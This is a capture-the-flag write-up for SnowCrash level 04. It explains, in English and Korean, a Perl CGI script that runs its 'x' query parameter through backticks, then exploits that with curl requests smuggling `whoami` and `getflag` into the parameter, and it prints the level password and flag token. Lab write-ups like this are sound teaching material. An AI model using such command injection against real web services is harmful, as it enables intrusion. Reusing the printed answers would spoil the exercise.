## Level 04

Put the password for the level04.

```
qi0maab88jeaj46qoumi7maus
```

With a command of _ls_, we found a file written in perl script. <ins>This is a simple **CGI**(Common Gateway Interface) script that takes a parameter "x" from the query string adn prints the result of runnig the command specified by the parameter using the 'echo' commmand. <ins>

In summary, the script takes a parameter named "x" from the query string, uses it as a command, executes the command, and prints the result.

> [!NOTE] What is CGI? :

> _CGI, or Common Gateway Interface, is a standard interface that enables communication between a web server and external programs or scripts. It allows for the creation of dynamic web pages, processing user input, and interaction with databases._

```
level04@SnowCrash:~$ cat level04.pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

<details>
  <summary> Details for the perl script </summary>

이 Perl 스크립트는 CGI(Common Gateway Interface) 스크립트로, 쿼리 문자열에서 "x"라는 매개변수를 가져와 해당 매개변수로 지정된 명령을 실행한 결과를 출력하는 간단한 CGI 스크립트입니다.

1. `#!/usr/bin/perl`: 이것은 해시뱅(해시 기호(#)와 느낌표(!)) 라인으로, 이 스크립트를 실행하기 위해 사용되어야 하는 Perl 인터프리터의 경로를 지정합니다.

2. `use CGI qw{param};`: 이 라인은 CGI 모듈에서 `param` 함수를 가져옵니다. `param` 함수는 쿼리 문자열에서 매개변수의 값을 가져오는 데 사용됩니다.

3. `print "Content-type: text/html\n\n";`: 이 라인은 "text/html" 형식의 콘텐츠임을 나타내는 HTTP 헤더를 전송합니다. 두 번의 개행(`\n\n`)은 헤더와 본문을 구분합니다.

4. `sub x { ... }`: 이것은 "x"라는 서브루틴(함수)을 정의합니다. 하나의 매개변수를 사용하고 그 값을 `$y` 변수에 할당합니다.

5. `$y = $_[0];`: 이 라인은 서브루틴에 전달된 첫 번째(이 경우에는 유일한) 인수를 `$y` 변수에 할당합니다.

6. `print `echo $y 2>&1`;`: 이 라인은 `$y`에 지정된 명령의 결과를 출력합니다. 역따옴표(`)는 명령을 실행하는 데 사용되며, `2>&1`은 표준 출력과 표준 에러를 모두 출력으로 리다이렉션하는 것입니다. 이는 일반 출력과 오류 메시지를 모두 캡처하는 일반적인 기술입니다.

7. `x(param("x"));`: 이 라인은 쿼리 문자열에서 "x" 매개변수의 값을 사용하여 "x" 서브루틴을 호출합니다.

요약하면, 이 스크립트는 쿼리 문자열에서 "x"라는 매개변수를 가져와 해당 값을 명령으로 사용하여 명령을 실행하고 결과를 출력합니다.

Below is the example of an error message based on our requests to a web server running on 127.0.0.1:4747 (The case that I omit the x parameter for intention to see the response.)

```
level04@SnowCrash:~$ curl '127.0.0.1:4747/level.pl?=`whoami`'
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /level.pl was not found on this server.</p>
<hr>
<address>Apache/2.2.22 (Ubuntu) Server at 127.0.0.1 Port 4747</address>
</body></html>
level04@SnowCrash:~$ curl '127.0.0.1:4747/level.pl?=`getflag`'
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /level.pl was not found on this server.</p>
<hr>
<address>Apache/2.2.22 (Ubuntu) Server at 127.0.0.1 Port 4747</address>
</body></html>
```

</details>

<br>

**Differences of using double quotes and backticks** in shell commandds within perl

So we can see the perl version 14 is on our shell.

```
level04@SnowCrash:~$ perl --version

This is perl 5, version 14, subversion 2 (v5.14.2) built for i686-linux-gnu-thread-multi-64int
(with 57 registered patches, see perl -V for more detail)
```

**1. Double quotes("")**

So, I run a command with a one parameter x as below with **""** (double quotes) . If that word is a string as "Hello world", it prints out the program as below, it treats the command as part of a string :

```
level04@SnowCrash:~$ ./level04.pl x="Hello world"
Content-type: text/html

Hello world
level04@SnowCrash:~$ ./level04.pl x="Hello Yooyoo"
Content-type: text/html

Hello Yooyoo
```

**2. Backticks(``)**
When you use backticks, the enclosed command is executed in a subshell, and its output is captured. **It treats the enclosed content as a shell command and executes it.**

```
level04@SnowCrash:~$ ./level04.pl x=`whoami`
Content-type: text/html

level04
level04@SnowCrash:~$ ./level04.pl x=`who`
Content-type: text/html

level02
level04@SnowCrash:~$ ./level04.pl x=`whom`
The program 'whom' can be found in the following packages:
 * mailutils-mh
 * nmh
Ask your administrator to install one of them
Content-type: text/html
```

> [!NOTE]

> PERL (Practical Extraction and Reporting Language) ? Perl is a high-level, general-purpose programming language that was originally developed for text manipulation and used extensively for system administration tasks.

> 1. Perl was initially designed for efficient text processing, making it well-suited for tasks involving regular expressions, string mainpulation, and file processing.

> 2. Perl has been traditionally used for system administration tasks, such as automating repetitive operations, managing files, and interacting with the operating system.

> 3. Perl has been historically popular for server-side scripting in web development. The CGI (Common Gateway Interface) protocol, which allows web servers to execute scripts, played a significant role in the early days of dynamic web content.

<br>

So, what if we add the same logic for the localhost:4747 ?
Nothing came out..

```
level04@SnowCrash:~$ perl localhost:4747
Can't open perl script "localhost:4747": No such file or directory
level04@SnowCrash:~$ ./level04.pl x=`localhost:4747`
localhost:4747: command not found
Content-type: text/html


level04@SnowCrash:~$ curl localhost:4747
```

Or, what if we run on our host with the port 4747?
Flag04 came out with the whoami parameter.

```
level04@SnowCrash:~$ curl '127.0.0.1:4747/level04.pl?x=`whoami`'

flag04
```

Maybe we can try again with x parameter with **getflag**. And here we go, we got the flag :)

```
level04@SnowCrash:~$ curl '127.0.0.1:4747/level04.pl?x=`getflag`'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

<details>
  <summary> Password </summary>
  ne2searoevaevoem4ov4ar8ap
  </details>
